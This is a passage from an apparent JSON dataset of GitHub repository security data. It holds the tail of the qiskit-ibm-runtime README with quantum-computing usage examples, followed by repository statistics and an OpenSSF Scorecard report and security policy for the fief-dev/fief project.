quantum circuits with more efficiency on quantum processors, by including near-time computations such as error suppression and error mitigation. Examples of error suppression include dynamical decoupling, noise-aware compilation, error mitigation including readout mitigation, zero-noise extrapolation (ZNE), and probabilistic error cancellation (PEC).\n\nUsing the runtime service, a research team at IBM Quantum was able to achieve a 120x speedup\nin their lithium hydride simulation. For more information, see the\n[IBM Research blog](https://research.ibm.com/blog/120x-quantum-speedup).\n\nThis module provides the interface to access the Qiskit Runtime service on IBM Quantum Platform or IBM Cloud.\n\n## Installation\n\nYou can install this package using pip:\n\n```bash\npip install qiskit-ibm-runtime\n```\n\n## Account setup\n\n### Qiskit Runtime service on IBM Quantum Platform\n\nYou will need your IBM Quantum API token to authenticate with the runtime service:\n\n1. Create an IBM Quantum account or log in to your existing account by visiting the [IBM Quantum login page].\n\n1. Copy (and optionally regenerate) your API token from your\n   [IBM Quantum account page].\n\n### Qiskit Runtime service on IBM Cloud\n\nThe runtime service is now part of the IBM Quantum Services on IBM Cloud. To use this service, you'll\nneed to create an IBM Cloud account and a quantum service instance.\n[This guide](https://cloud.ibm.com/docs/quantum-computing?topic=quantum-computing-get-started)\ncontains step-by-step instructions, including how to find your\nIBM Cloud API key and Cloud Resource Name (CRN), which you will need for authentication.\n\n\n### Save your account on disk\n\nOnce you have the account credentials, you can save them on disk, so you won't have to input\nthem each time. The credentials are saved in the `$HOME/.qiskit/qiskit-ibm.json` file, where `$HOME` is your home directory.\n\n| :warning: Account credentials are saved in plain text, so only do so if you are using a trusted device. |\n|:---------------------------|\n\n ```python\nfrom qiskit_ibm_runtime import QiskitRuntimeService\n\n# Save an IBM Cloud account.\nQiskitRuntimeService.save_account(channel=\"ibm_cloud\", token=\"MY_IBM_CLOUD_API_KEY\", instance=\"MY_IBM_CLOUD_CRN\")\n\n# Save an IBM Quantum account.\nQiskitRuntimeService.save_account(channel=\"ibm_quantum\", token=\"MY_IBM_QUANTUM_TOKEN\")\n```\n\nOnce the account is saved on disk, you can instantiate the service without any arguments:\n\n```python\nfrom qiskit_ibm_runtime import QiskitRuntimeService\nservice = QiskitRuntimeService()\n```\n\n### Loading account from environment variables\n\nAlternatively, the service can discover credentials from environment variables:\n```bash\nexport QISKIT_IBM_TOKEN=\"MY_IBM_CLOUD_API_KEY\"\nexport QISKIT_IBM_INSTANCE=\"MY_IBM_CLOUD_CRN\"\nexport QISKIT_IBM_CHANNEL=\"ibm_cloud\"\n```\n\nThen instantiate the service without any arguments:\n```python\nfrom qiskit_ibm_runtime import QiskitRuntimeService\nservice = QiskitRuntimeService()\n```\n\n### Enabling account for current Python session\n\nAs another alternative, you can also enable an account just for the current session by instantiating the\nservice with your credentials.\n\n```python\nfrom qiskit_ibm_runtime import QiskitRuntimeService\n\n# For an IBM Cloud account.\nibm_cloud_service = QiskitRuntimeService(channel=\"ibm_cloud\", token=\"MY_IBM_CLOUD_API_KEY\", instance=\"MY_IBM_CLOUD_CRN\")\n\n# For an IBM Quantum account.\nibm_quantum_service = QiskitRuntimeService(channel=\"ibm_quantum\", token=\"MY_IBM_QUANTUM_TOKEN\")\n```\n\n## Primitives\n\nAll quantum applications and algorithms level are fundamentally built using these steps:\n1. Map classical inputs to a quantum problem\n2. Translate problem for optimized quantum execution.\n3. Execute the quantum circuits by using a primitive (Estimator or Sampler).\n4. Post-process, return result in classical format.\n\n**Primitives** are base-level functions that serve as building blocks for many quantum algorithms and applications.\nPrimitives accept vectorized inputs, where single circuits can be grouped with array-valued specifications. That is, one circuit can be executed for arrays of n parameter sets, n observables, or both (in the case of the estimator). Each group is called a Primitive Unified Bloc (PUB), and can be represented as a tuple.\n\nThe [primitive interfaces](https://docs.quantum.ibm.com/api/qiskit/primitives) are defined in Qiskit.\n\nThe IBM Runtime service offers these primitives with additional features, such as built-in error suppression and mitigation.\n\nThere are several different options you can specify when calling the primitives. See [Primitive options](https://docs.quantum.ibm.com/api/qiskit-ibm-runtime/options) for more information.\n\n### Primitive versions\n\nVersion 2 of the primitives is introduced by `qiskit-ibm-runtime` release 0.21.0. Version 1 of the primitives is no longer supported. Refer to [Migrate to the V2 primitives](https://docs.quantum.ibm.com/migration-guides/v2-primitives) on how to migratie to V2 primitives. The examples below all use V2 primitives.\n\n### Sampler\n\nThis primitive takes a list of user circuits (including measurements) as input and returns the sampling output. The type of the output is defined by the program (typically bit-arrays), and the output data is separated by the classical register names.\n\nTo invoke the `Sampler` primitive\n\n```python\nfrom qiskit import QuantumCircuit\nfrom qiskit.transpiler.preset_passmanagers import generate_preset_pass_manager\nfrom qiskit_ibm_runtime import QiskitRuntimeService, SamplerV2 as Sampler\n\nservice = QiskitRuntimeService()\n\n# 1. A quantum circuit for preparing the quantum state (|00> + |11>)/rt{2}\nbell = QuantumCircuit(2)\nbell.h(0)\nbell.cx(0, 1)\nbell.measure_all()\n\n# 2: Optimize problem for quantum execution.\nbackend = service.least_busy(operational=True, simulator=False)\npm = generate_preset_pass_manager(backend=backend, optimization_level=1)\nisa_circuit = pm.run(bell)\n\n# 3. Execute using the Sampler primitive\nsampler = Sampler(mode=backend)\nsampler.options.default_shots = 1024  # Options can be set using auto-complete.\njob = sampler.run([isa_circuit])\nprint(f\"Job ID is {job.job_id()}\")\npub_result = job.result()[0]\nprint(f\"Counts for the meas output register: {pub_result.data.meas.get_counts()}\")\n```\n\n### Estimator\n\nThis primitive takes circuits and observables as input, to evaluate expectation values and standard error for a given parameter input. This Estimator allows users to efficiently calculate and interpret expectation values of quantum operators required for many algorithms.\n\nTo invoke the `Estimator` primitive:\n\n```python\nfrom qiskit_ibm_runtime import QiskitRuntimeService, EstimatorV2 as Estimator\nfrom qiskit.quantum_info import SparsePauliOp\nfrom qiskit import QuantumCircuit\nfrom qiskit.circuit import Parameter\nimport numpy as np\n\nservice = QiskitRuntimeService()\n\n# 1. A quantum circuit for preparing the quantum state (|000> + e^{itheta} |111>)/rt{2}\ntheta = Parameter('θ')\ncircuit = QuantumCircuit(3)\ncircuit.h(0) # generate superposition\ncircuit.p(theta, 0) # add quantum phase\ncircuit.cx(0, 1) # condition 1st qubit on 0th qubit\ncircuit.cx(0, 2) # condition 2nd qubit on 0th qubit\n\n# The observable to be measured\nM1 = SparsePauliOp.from_list([(\"XXY\", 1), (\"XYX\", 1), (\"YXX\", 1), (\"YYY\", -1)])\n\n# batch of theta parameters to be executed\npoints = 50\ntheta1 = []\nfor x in range(points):\n    theta = [x*2.0*np.pi/50]\n    theta1.append(theta)\n\n# 2: Optimize problem for quantum execution.\nbackend = service.least_busy(operational=True, simulator=False)\npm = generate_preset_pass_manager(backend=backend, optimization_level=1)\nisa_circuit = pm.run(circuit)\nisa_observables = M1.apply_layout(isa_circuit.layout)\n\n# 3. Execute using the Estimator primitive\nestimator = Estimator(backend)\nestimator.options.resilience_level = 1  # Options can be set using auto-complete.\njob = estimator.run([(isa_circuit, isa_observables, theta1)])\nprint(f\"Job ID is {job.job_id()}\")\npub_result = job.result()[0]\nprint(f\"Expectation values: {pub_result.data.evs}\")\n```\n\nThis code batches together 50 parameters to be executed in a single job. If a user wanted to find the `theta` that optimized the observable, they could plot and observe it occurs at `theta=np.pi/2`. For speed we recommend batching results together (note that depending on your access, there may be limits on the number of circuits, objects, and parameters that you can send).\n\n\n## Session\n\nIn many algorithms and applications, an Estimator needs to be called iteratively without incurring queuing delays on each iteration. To solve this, the IBM Runtime service provides a **Session**. A session starts when the first job within the session is started, and subsequent jobs within the session are prioritized by the scheduler.\n\nYou can use the [`qiskit_ibm_runtime.Session`](https://github.com/Qiskit/qiskit-ibm-runtime/blob/main/qiskit_ibm_runtime/session.py) class to start a\nsession. Consider the same example above and try to find the optimal `theta`. The following example uses the [golden search method](https://en.wikipedia.org/wiki/Golden-section_search) to iteratively find the optimal theta that maximizes the observable.\n\nTo invoke the `Estimator` primitive within a session:\n\n```python\nfrom qiskit_ibm_runtime import QiskitRuntimeService, Session, EstimatorV2 as Estimator\nfrom qiskit.quantum_info import SparsePauliOp\nfrom qiskit import QuantumCircuit\nfrom qiskit.circuit import Parameter\nimport numpy as np\n\nservice = QiskitRuntimeService()\n\n# 1. A quantum circuit for preparing the quantum state (|000> + e^{itheta} |111>)/rt{2}\ntheta = Parameter('θ')\ncircuit = QuantumCircuit(3)\ncircuit.h(0) # generate superpostion\ncircuit.p(theta,0) # add quantum phase\ncircuit.cx(0, 1) # condition 1st qubit on 0th qubit\ncircuit.cx(0, 2) # condition 2nd qubit on 0th qubit\n\n# The observable to be measured\nM1 = SparsePauliOp.from_list([(\"XXY\", 1), (\"XYX\", 1), (\"YXX\", 1), (\"YYY\", -1)])\n\ngr = (np.sqrt(5) + 1) / 2 # golden ratio\nthetaa = 0 # lower range of theta\nthetab = 2*np.pi # upper range of theta\ntol = 1e-1 # tol\n\n# 2: Optimize problem for quantum execution.\nbackend = service.least_busy(operational=True, simulator=False)\npm = generate_preset_pass_manager(backend=backend, optimization_level=1)\nisa_circuit = pm.run(circuit)\nisa_observables = M1.apply_layout(isa_circuit.layout)\n\n# 3. Execute iteratively using the Estimator primitive\nwith Session(service=service, backend=backend) as session:\n    estimator = Estimator(session=session)\n    estimator.options.default_precision = 0.03  # Options can be set using auto-complete.\n    #next test range\n    thetac = thetab - (thetab - thetaa) / gr\n    thetad = thetaa + (thetab - thetaa) / gr\n    while abs(thetab - thetaa) > tol:\n        print(f\"max value of M1 is in the range theta = {[thetaa, thetab]}\")\n        job = estimator.run([(isa_circuit, isa_observables, [[thetac],[thetad]])])\n        test = job.result()[0].data.evs\n        if test[0] > test[1]:\n            thetab = thetad\n        else:\n            thetaa = thetac\n        thetac = thetab - (thetab - thetaa) / gr\n        thetad = thetaa + (thetab - thetaa) / gr\n\n    # Final job to evaluate Estimator at midpoint found using golden search method\n    theta_mid = (thetab + thetaa) / 2\n    job = estimator.run([(isa_circuit, isa_observables, theta_mid)])\n    print(f\"Session ID is {session.session_id}\")\n    print(f\"Final Job ID is {job.job_id()}\")\n    print(f\"Job result is {job.result()[0].data.evs} at theta = {theta_mid}\")\n```\n\nThis code returns `Job result is [4.] at theta = 1.575674623307102` using only nine iterations. This is a very powerful extension to the primitives. However, using too much code between iterative calls can lock the QPU and use excessive QPU time, which is expensive. We recommend only using sessions when needed. The Sampler can also be used within a session, but there are not any well-defined examples for this.\n\n## Instances\n\nAccess to IBM Quantum Platform channel is controlled by the instances (previously called providers) to which you are assigned. An instance is defined by a hierarchical organization of hub, group, and project. A hub is the top level of a given hierarchy (organization) and contains within it one or more groups. These groups are in turn populated with projects. The combination of hub/group/project is called an instance. Users can belong to more than one instance at any time.\n\n> **_NOTE:_** IBM Cloud instances are different from IBM Quantum Platform instances.  IBM Cloud does not use the hub/group/project structure for user management. To view and create IBM Cloud instances, visit the [IBM Cloud Quantum Instances page](https://cloud.ibm.com/quantum/instances).\n\nTo view a list of your instances, visit your [account settings page](https://www.quantum-computing.ibm.com/account) or use the `instances()` method.\n\nYou can specify an instance when initializing the service or provider, or when picking a backend:\n\n```python\n# Optional: List all the instances you can access.\nservice = QiskitRuntimeService(channel='ibm_quantum')\nprint(service.instances())\n\n# Optional: Specify the instance at service level. This becomes the default unless overwritten.\nservice = QiskitRuntimeService(channel='ibm_quantum', instance=\"hub1/group1/project1\")\nbackend1 = service.backend(\"ibmq_manila\")\n\n# Optional: Specify the instance at the backend level, which overwrites the service-level specification when this backend is used.\nbackend2 = service.backend(\"ibmq_manila\", instance=\"hub2/group2/project2\")\n\nsampler1 = Sampler(mode=backend1)    # this will use hub1/group1/project1\nsampler2 = Sampler(mode=backend2)    # this will use hub2/group2/project2\n```\n\nIf you do not specify an instance, then the code will select one in the following order:\n\n1. If your account only has access to one instance, it is selected by default.\n2. If your account has access to multiple instances, but only one can access the requested backend, the instance with access is selected.\n3. In all other cases, the code selects the first instance other than ibm-q/open/main that has access to the backend.\n\n## Access your IBM Quantum backends\n\nA **backend** is a quantum device or simulator capable of running quantum circuits or pulse schedules.\n\nYou can query for the backends you have access to. Attributes and methods of the returned instances\nprovide information, such as qubit counts, error rates, and statuses, of the backends.\n\n```python\nfrom qiskit_ibm_runtime import QiskitRuntimeService\nservice = QiskitRuntimeService()\n\n# Display all backends you have access.\nprint(service.backends())\n\n# Get a specific backend.\nbackend = service.backend('ibm_brisbane')\n\n# Print backend coupling map.\nprint(backend.coupling_map)\n```\n\n## Next Steps\n\nNow you're set up and ready to check out some of the [tutorials].\n\n## Contribution guidelines\n\nIf you'd like to contribute to qiskit-ibm-runtime, please take a look at our\n[contribution guidelines]. This project adheres to Qiskit's [code of conduct].\nBy participating, you are expected to uphold to this code.\n\nWe use [GitHub issues] for tracking requests and bugs. Please use our [slack]\nfor discussion and simple questions. To join our Slack community use the\ninvite link at [ibm.com/quantum/qiskit]. For questions that are more suited for a forum we\nuse the `Qiskit` tag in [Stack Exchange].\n\n## Authors and Citation\n\nQiskit Runtime IBM Client is the work of [many people](https://github.com/Qiskit/qiskit-ibm-runtime/graphs/contributors) who contribute to the project at different levels.\nIf you use Qiskit, please cite as per the included [BibTeX file](https://github.com/Qiskit/qiskit/blob/main/CITATION.bib).\n\n## License\n\n[Apache License 2.0].\n\n\n[IBM Quantum]: https://www.ibm.com/quantum-computing/\n[IBM Quantum login page]:  https://quantum-computing.ibm.com/login\n[IBM Quantum account page]: https://quantum-computing.ibm.com/account\n[contribution guidelines]: https://github.com/Qiskit/qiskit-ibm-runtime/blob/main/CONTRIBUTING.md\n[code of conduct]: https://github.com/Qiskit/qiskit-ibm-runtime/blob/main/CODE_OF_CONDUCT.md\n[GitHub issues]: https://github.com/Qiskit/qiskit-ibm-runtime/issues\n[slack]: https://qiskit.slack.com\n[ibm.com/quantum/qiskit]: https://www.ibm.com/quantum/qiskit\n[Stack Exchange]: https://quantumcomputing.stackexchange.com/questions/tagged/qiskit\n[many people]: https://github.com/Qiskit/qiskit-ibm-runtime/graphs/contributors\n[BibTeX file]: https://github.com/Qiskit/qiskit/blob/master/Qiskit.bib\n[Apache License 2.0]: https://github.com/Qiskit/qiskit-ibm-runtime/blob/main/LICENSE.txt\n[tutorials]: https://learning.quantum.ibm.com/catalog/tutorials\n",
        "num_commits": 1775,
        "project_age_days": 1089,
        "project_created_at": "2021-11-05",
        "latest_updated_at": "2024-10-28",
        "latest_pushed_at": "2024-10-28",
        "num_contributors": 93,
        "num_pull": 1233,
        "num_issues": 1981,
        "num_opening_issue": 74,
        "project_size(kB)": 23427,
        "num_stargazers": 153,
        "num_watchers": 153,
        "num_forks": 154,
        "num_subscribers": 15,
        "SecurityPolicy_created_at": "2023-02-17 19:41:01",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "d351f40c3e52f62f13d0fd580d49df94c54f5e15",
                "url": "https://github.com/Qiskit/qiskit-ibm-runtime/commit/d351f40c3e52f62f13d0fd580d49df94c54f5e15",
                "date": "2023-02-17 19:41:01"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "advisory",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Generic policy",
            "Scope of practice",
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": true
    },
    {
        "project_name": "fief-dev/fief",
        "project_url": "https://github.com/fief-dev/fief",
        "SSF": {
            "date": "2024-10-29T23:14:00+07:00",
            "repo": {
                "name": "github.com/fief-dev/fief",
                "commit": "51050857205f40732d940a4baaf49ca0411b01c1"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 5.7,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Warn: branch protection not enabled for branch 'main'"
                    ],
                    "score": 0,
                    "reason": "branch protection not enabled on development/release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 9,
                    "reason": "18 out of 19 merged PRs checked by a CI test -- score normalized to 9",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "Found 0/13 approved changesets -- score normalized to 0",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: encode contributor org/company found, fastapi-users contributor org/company found, fief-dev contributor org/company found, polarsource contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 4 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Info: detected update tool: Dependabot: .github/dependabot.yml:1"
                    ],
                    "score": 10,
                    "reason": "update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE.md:0",
                        "Warn: project license file does not contain an FSF or OSI license."
                    ],
                    "score": 9,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "30 commit(s) and 6 issue activity found in the last 90 days -- score normalized to 10",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Warn: no GitHub/GitLab publishing workflow detected."
                    ],
                    "score": -1,
                    "reason": "packaging workflow not detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build.yml:172: update your workflow using https://app.stepsecurity.io/secureworkflow/fief-dev/fief/build.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build.yml:183: update your workflow using https://app.stepsecurity.io/secureworkflow/fief-dev/fief/build.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/build.yml:188: update your workflow using https://app.stepsecurity.io/secureworkflow/fief-dev/fief/build.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build.yml:12: update your workflow using https://app.stepsecurity.io/secureworkflow/fief-dev/fief/build.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build.yml:83: update your workflow using https://app.stepsecurity.io/secureworkflow/fief-dev/fief/build.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build.yml:101: update your workflow using https://app.stepsecurity.io/secureworkflow/fief-dev/fief/build.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build.yml:103: update your workflow using https://app.stepsecurity.io/secureworkflow/fief-dev/fief/build.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build.yml:112: update your workflow using https://app.stepsecurity.io/secureworkflow/fief-dev/fief/build.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/build.yml:135: update your workflow using https://app.stepsecurity.io/secureworkflow/fief-dev/fief/build.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build.yml:147: update your workflow using https://app.stepsecurity.io/secureworkflow/fief-dev/fief/build.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:40: update your workflow using https://app.stepsecurity.io/secureworkflow/fief-dev/fief/codeql-analysis.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:44: update your workflow using https://app.stepsecurity.io/secureworkflow/fief-dev/fief/codeql-analysis.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:55: update your workflow using https://app.stepsecurity.io/secureworkflow/fief-dev/fief/codeql-analysis.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:69: update your workflow using https://app.stepsecurity.io/secureworkflow/fief-dev/fief/codeql-analysis.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/docker.yml:18: update your workflow using https://app.stepsecurity.io/secureworkflow/fief-dev/fief/docker.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/sentry.yml:12: update your workflow using https://app.stepsecurity.io/secureworkflow/fief-dev/fief/sentry.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/sentry.yml:18: update your workflow using https://app.stepsecurity.io/secureworkflow/fief-dev/fief/sentry.yml/main?enable=pin",
                        "Warn: containerImage not pinned by hash: .devcontainer/Dockerfile:1: pin your Docker image by updating mcr.microsoft.com/devcontainers/python:3.12 to mcr.microsoft.com/devcontainers/python:3.12@sha256:6df2043e0cc9f73751c605aa101aafdd74b7b1cc52b7510b729f085e21ade8cd",
                        "Warn: containerImage not pinned by hash: docker/Dockerfile:1: pin your Docker image by updating python:3.12-slim to python:3.12-slim@sha256:032c52613401895aa3d418a4c563d2d05f993bc3ecc065c8f4e2280978acd249",
                        "Warn: pipCommand not pinned by hash: docker/Dockerfile:8-13",
                        "Warn: pipCommand not pinned by hash: docker/Dockerfile:8-13",
                        "Warn: pipCommand not pinned by hash: .github/workflows/build.yml:109",
                        "Warn: pipCommand not pinned by hash: .github/workflows/build.yml:110",
                        "Info:   0 out of  14 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of   3 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of   2 containerImage dependencies pinned",
                        "Info:   0 out of   4 pipCommand dependencies pinned",
                        "Info:   1 out of   1 npmCommand dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Info: SAST configuration detected: CodeQL",
                        "Warn: 19 commits out of 20 are checked with a SAST tool"
                    ],
                    "score": 9,
                    "reason": "SAST tool detected but not run on all commits",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: SECURITY.md:1",
                        "Info: Found linked content: SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: SECURITY.md:1",
                        "Info: Found text in security policy: SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": [
                        "Warn: release artifact v0.29.1 not signed: https://api.github.com/repos/fief-dev/fief/releases/179685482",
                        "Warn: release artifact v0.29.0 not signed: https://api.github.com/repos/fief-dev/fief/releases/179680446",
                        "Warn: release artifact v0.28.9 not signed: https://api.github.com/repos/fief-dev/fief/releases/178511067",
                        "Warn: release artifact v0.28.8 not signed: https://api.github.com/repos/fief-dev/fief/releases/172499960",
                        "Warn: release artifact v0.28.7 not signed: https://api.github.com/repos/fief-dev/fief/releases/171004744",
                        "Warn: release artifact v0.29.1 does not have provenance: https://api.github.com/repos/fief-dev/fief/releases/179685482",
                        "Warn: release artifact v0.29.0 does not have provenance: https://api.github.com/repos/fief-dev/fief/releases/179680446",
                        "Warn: release artifact v0.28.9 does not have provenance: https://api.github.com/repos/fief-dev/fief/releases/178511067",
                        "Warn: release artifact v0.28.8 does not have provenance: https://api.github.com/repos/fief-dev/fief/releases/172499960",
                        "Warn: release artifact v0.28.7 does not have provenance: https://api.github.com/repos/fief-dev/fief/releases/171004744"
                    ],
                    "score": 0,
                    "reason": "Project has not signed or included provenance with any releases.",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Info: jobLevel 'actions' permission set to 'read': .github/workflows/codeql-analysis.yml:28",
                        "Info: jobLevel 'contents' permission set to 'read': .github/workflows/codeql-analysis.yml:29",
                        "Warn: no topLevel permission defined: .github/workflows/build.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/codeql-analysis.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/docker.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/sentry.yml:1",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "0 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/fief-dev/fief/contents/SECURITY.md",
        "SecurityPolicy_content": "# Security Policy\n\n## Supported Versions\n\nWe provide support for the latest version and recommend to upgrade as soon as a new version is released.\n\n## Reporting a Vulnerability\n\nIf you have identified a vulnerability, please report it using [GitHub Security Advisory](https://github.com/fief-dev/fief/security/advisories/new) tool, to ensure confidentiality and security.\n\nWe'll review it as soon as possible and publish a fix accordingly.\n",
        "project_all_labels": [
            "bug",
            "dependencies",
            "documentation",
            "duplicate",
            "enhancement",
            "feedback",
            "github_actions",
            "good first issue",
            "help wanted",
            "integration-js",
            "integration-python",
            "invalid",
            "polar",
            "python",
            "question",
            "self-hosting",
            "wontfix"
        ],
